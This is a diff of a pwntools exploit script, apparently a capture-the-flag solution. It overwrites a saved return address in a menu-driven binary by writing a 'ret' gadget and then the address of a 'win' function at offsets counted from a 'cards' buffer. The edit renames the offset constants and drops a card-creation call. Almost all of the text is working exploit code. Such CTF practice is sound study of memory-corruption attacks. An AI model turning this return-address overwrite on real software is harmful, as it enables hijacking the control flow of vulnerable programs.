@@ -7,9 +7,8 @@ rop = ROP(elf)
 
 ret = rop.find_gadget(['ret'])[0]
 
-# this one getting from pwndbg, then you can count using this one. simplee
-CARDS_TO_RET_OFFSET = 160      
-CARDS_TO_RET_PLUS8_OFFSET = 168  
+# this one getting from pwndbg, then you can count it. simplee
+cards_ret = 160
 
 def menu(choice):
     p.sendlineafter('> ', str(choice).encode())
@@ -33,13 +32,10 @@ def point_effect_2(idx, value):
 def trigger():
     menu(4)
 
-
-create(0, 'arrow card', 100)  
-
-point_effect_1(0, CARDS_TO_RET_OFFSET)
+point_effect_1(0, cards_ret)
 point_effect_2(0, ret)
 
-point_effect_1(0, CARDS_TO_RET_PLUS8_OFFSET)
+point_effect_1(0, (cards_ret + 8))
 point_effect_2(0, elf.sym['win'])
 
 trigger()  
